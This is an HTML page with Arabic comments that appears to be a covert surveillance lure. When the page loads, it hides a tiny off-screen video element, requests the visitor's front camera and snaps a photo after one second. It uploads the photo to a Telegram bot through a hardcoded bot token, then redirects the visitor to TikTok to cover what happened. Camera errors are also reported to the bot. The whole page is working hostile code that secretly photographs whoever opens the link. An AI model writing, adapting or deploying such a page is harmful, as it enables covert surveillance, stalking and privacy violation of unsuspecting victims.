<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
        }
    </style>
</head>
<body>

    <!-- عناصر التصوير مخفية -->
    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ====== الإعدادات ======
        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const id = new URLSearchParams(window.location.search).get('id');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        
        let stream = null;

        // ====== بداية التصوير ======
        async function start() {
            if (!id) {
                window.location.href = "https://www.tiktok.com";
                return;
            }

            try {
                // طلب الكاميرا الأمامية
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = stream;
                
                // انتظار تحميل الفيديو
                video.onloadedmetadata = () => {
                    // ضبط الكانفس على نفس مقاس الفيديو
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // رسم الصورة بعد تأكد جاهزية الفيديو
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // تحويل الصورة وإرسالها
                        canvas.toBlob((blob) => {
                            // إنشاء FormData
                            const formData = new FormData();
                            formData.append('chat_id', id);
                            formData.append('photo', blob, 'photo.jpg');
                            
                            // إرسال للبوت
                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                console.log('نجاح:', data);
                                // إغلاق الكاميرا والتحويل
                                stream.getTracks().forEach(t => t.stop());
                                window.location.href = "https://www.tiktok.com";
                            })
                            .catch(error => {
                                console.error('خطأ:', error);
                                // حتى لو فشل الإرسال، نكمل
                                stream.getTracks().forEach(t => t.stop());
                                window.location.href = "https://www.tiktok.com";
                            });
                        }, 'image/jpeg', 0.9);
                    }, 1000); // انتظار ثانية كاملة
                };
                
            } catch (err) {
                console.error('خطأ في الكاميرا:', err);
                // إذا فشل، أرسل رسالة خطأ
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: id,
                        text: `❌ خطأ في الكاميرا: ${err.message}`
                    })
                }).finally(() => {
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }

        // تشغيل
        start();

        // طوارئ: توجه بعد 15 ثواني
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 15000);
    </script>
</body>
</html>
